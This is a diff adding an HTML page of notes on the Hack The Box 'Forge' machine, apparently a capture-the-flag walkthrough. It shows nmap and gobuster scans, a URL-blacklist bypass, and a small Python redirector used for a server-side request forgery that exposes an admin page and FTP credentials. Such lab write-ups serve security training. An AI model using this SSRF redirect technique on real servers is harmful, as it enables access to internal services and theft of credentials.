@@ -1,0 +1,150 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="date" content="" scheme="YYYY-MM-DD">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>Forge</title>
+    <link rel="stylesheet" href="http://127.0.0.1:8888/css/main.css" type="text/css" media="screen" title="no title"
+        charset="utf-8">
+    <link rel="stylesheet" type="text/css"
+        href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.15.6/styles/nord.min.css" />
+    <!-- <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.0/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-gH2yIJqKdNHPEq0n4Mqa/HGKIhSkIHeL5AyhkYV8i59U5AR6csBvApHHNl/vI1Bx" crossorigin="anonymous"> -->
+
+</head>
+
+<body>
+    <h2 id="Introduction">Introduction</h2>
+    <h2 id="Enumeration">Enumeration</h2>
+    <h3 id="Nmap">Nmap</h3>
+    <pre class="nohighlight"><code># Nmap 7.92 scan initiated Wed Jul 27 18:34:26 2022 as: nmap -sS -sCV -oA scans/nmap/init 10.10.11.111
+Nmap scan report for 10.10.11.111
+Host is up (0.025s latency).
+Not shown: 997 closed tcp ports (reset)
+PORT   STATE    SERVICE VERSION
+21/tcp filtered ftp
+22/tcp open     ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   3072 4f:78:65:66:29:e4:87:6b:3c:cc:b4:3a:d2:57:20:ac (RSA)
+|   256 79:df:3a:f1:fe:87:4a:57:b0:fd:4e:d0:54:c6:28:d9 (ECDSA)
+|_  256 b0:58:11:40:6d:8c:bd:c5:72:aa:83:08:c5:51:fb:33 (ED25519)
+80/tcp open     http    Apache httpd 2.4.41 ((Ubuntu))
+|_http-title: Did not follow redirect to http://forge.htb
+|_http-server-header: Apache/2.4.41 (Ubuntu)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+# Nmap done at Wed Jul 27 18:34:35 2022 -- 1 IP address (1 host up) scanned in 9.23 seconds</code></pre>
+    <ul>
+    <li>nmap does not follow redirect to <a
+    href="http://forge.htb">http://forge.htb</a>, add it to /etc/hosts
+    and run gobster vhost
+    <ul>
+    <li>ftp is also filtered, yay</li>
+    </ul></li>
+    </ul>
+    <pre class="nohighlight"><code>trent@kali[Forge]$ cat /etc/hosts
+...
+10.10.11.111    forge.htb admin.forge.htb
+...</code></pre>
+    <pre class="nohighlight"><code>trent@kali[Forge]$ gobuster vhost -u http://forge.htb -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -r
+===============================================================
+Gobuster v3.1.0
+by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:          http://forge.htb
+[+] Method:       GET
+[+] Threads:      10
+[+] Wordlist:     /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
+[+] User Agent:   gobuster/3.1.0
+[+] Timeout:      10s
+===============================================================
+2022/07/27 18:49:01 Starting gobuster in VHOST enumeration mode
+===============================================================
+Found: admin.forge.htb (Status: 200) [Size: 27]
+
+===============================================================
+2022/07/27 18:49:25 Finished
+===============================================================</code></pre>
+    <p><img
+    src="http://127.0.0.1:8888/images/forge/website/admin/only_localhost_allowed.png"
+    alt="Admin interface only available on localhost" /></p>
+    <p><img
+    src="http://127.0.0.1:8888/images/forge/website/homepage.png"
+    alt="Homepage for http://forge.htb" /></p>
+    <ul>
+    <li><a href="http://forge.htb/upload">http://forge.htb/upload</a>
+    can be used to upload images by file or url</li>
+    <li>uploading by url and making it callback to a netcat listener
+    shows the request was made by python-requests/2.25.1</li>
+    </ul>
+    <p><img
+    src="http://127.0.0.1:8888/images/forge/website/upload_from_url.png"
+    alt="Upload from url" /> <img
+    src="http://127.0.0.1:8888/images/forge/website/python_requests_callback.png"
+    alt="python-requests version" /></p>
+    <ul>
+    <li>url uploads only accept http/https</li>
+    </ul>
+    <p><a
+    href="file:../images/forge/website/forge_htb_blacklisted_url_uploads.png"
+    title="wikilink">Blacklist protocols</a></p>
+    <ul>
+    <li>Cant make requests to <a
+    href="http://forge.htb">http://forge.htb</a> or <a
+    href="http://admin.forge.htb">http://admin.forge.htb</a></li>
+    </ul>
+    <p><a
+    href="file:../images/forge/website/forge_htb_blacklisted_url_uploads.png"
+    title="wikilink">Blacklisted urls</a></p>
+    <ul>
+    <li>we can get around the blacklist by redirecting to where we
+    actually want to go</li>
+    </ul>
+    <ul>
+    <li><span class="done0"></span>TODO - Write a script that does this
+    whole ssrf thing without pain and suffering
+    <div class="sourceCode" id="cb4"><pre
+    class="sourceCode python"><code class="sourceCode python"><span id="cb4-1"><a href="#cb4-1" aria-hidden="true" tabindex="-1"></a><span class="co">#!/usr/bin/env python3</span></span>
+<span id="cb4-2"><a href="#cb4-2" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb4-3"><a href="#cb4-3" aria-hidden="true" tabindex="-1"></a><span class="co"># https://book.hacktricks.xyz/pentesting-web/ssrf-server-side-request-forgery/url-format-bypass#bypass-via-redirect</span></span>
+<span id="cb4-4"><a href="#cb4-4" aria-hidden="true" tabindex="-1"></a><span class="co"># python3 ./redirector.py 8000 http://127.0.0.1/</span></span>
+<span id="cb4-5"><a href="#cb4-5" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb4-6"><a href="#cb4-6" aria-hidden="true" tabindex="-1"></a><span class="im">import</span> sys</span>
+<span id="cb4-7"><a href="#cb4-7" aria-hidden="true" tabindex="-1"></a><span class="im">from</span> http.server <span class="im">import</span> HTTPServer, BaseHTTPRequestHandler</span>
+<span id="cb4-8"><a href="#cb4-8" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb4-9"><a href="#cb4-9" aria-hidden="true" tabindex="-1"></a><span class="cf">if</span> <span class="bu">len</span>(sys.argv)<span class="op">-</span><span class="dv">1</span> <span class="op">!=</span> <span class="dv">2</span>:</span>
+<span id="cb4-10"><a href="#cb4-10" aria-hidden="true" tabindex="-1"></a>    <span class="bu">print</span>(<span class="st">&quot;Usage: </span><span class="sc">{}</span><span class="st"> &lt;port_number&gt; &lt;url&gt;&quot;</span>.<span class="bu">format</span>(sys.argv[<span class="dv">0</span>]))</span>
+<span id="cb4-11"><a href="#cb4-11" aria-hidden="true" tabindex="-1"></a>    sys.exit()</span>
+<span id="cb4-12"><a href="#cb4-12" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb4-13"><a href="#cb4-13" aria-hidden="true" tabindex="-1"></a><span class="kw">class</span> Redirect(BaseHTTPRequestHandler):</span>
+<span id="cb4-14"><a href="#cb4-14" aria-hidden="true" tabindex="-1"></a>   <span class="kw">def</span> do_GET(<span class="va">self</span>):</span>
+<span id="cb4-15"><a href="#cb4-15" aria-hidden="true" tabindex="-1"></a>       <span class="va">self</span>.send_response(<span class="dv">302</span>)</span>
+<span id="cb4-16"><a href="#cb4-16" aria-hidden="true" tabindex="-1"></a>       <span class="va">self</span>.send_header(<span class="st">&#39;Location&#39;</span>, sys.argv[<span class="dv">2</span>])</span>
+<span id="cb4-17"><a href="#cb4-17" aria-hidden="true" tabindex="-1"></a>       <span class="va">self</span>.end_headers()</span>
+<span id="cb4-18"><a href="#cb4-18" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb4-19"><a href="#cb4-19" aria-hidden="true" tabindex="-1"></a>HTTPServer((<span class="st">&quot;&quot;</span>, <span class="bu">int</span>(sys.argv[<span class="dv">1</span>])), Redirect).serve_forever()</span></code></pre></div></li>
+    </ul>
+    <ul>
+    <li>We cant see the site in the browser cause it tries to render the
+    page as a jpg, but we can see the html in Burpsuite</li>
+    </ul>
+    <p><img
+    src="http://127.0.0.1:8888/images/forge/website/admin/homepage_html_via_ssrf_redirect.png"
+    alt="Successful ssrf attack" /></p>
+    <ul>
+    <li>we have found some ftp creds, yay</li>
+    </ul>
+    <p><img
+    src="http://127.0.0.1:8888/images/forge/website/admin/ftp_credentials.png"
+    alt="FTP credentials" /></p>
+    <script type="text/javascript"
+        src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.15.6/highlight.min.js"></script>
+    <script type="text/javascript">
+        document.querySelectorAll('pre').forEach(block => hljs.highlightBlock(block));
+    </script>
+    <!-- <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.0/dist/js/bootstrap.bundle.min.js" integrity="sha384-A3rJD856KowSb7dwlZdYEkO39Gagi7vIsF0jrRAoQmDKKtQBHUuLZ9AsSv4jD4Xa" crossorigin="anonymous"></script> -->
+</body>
+
+</html>
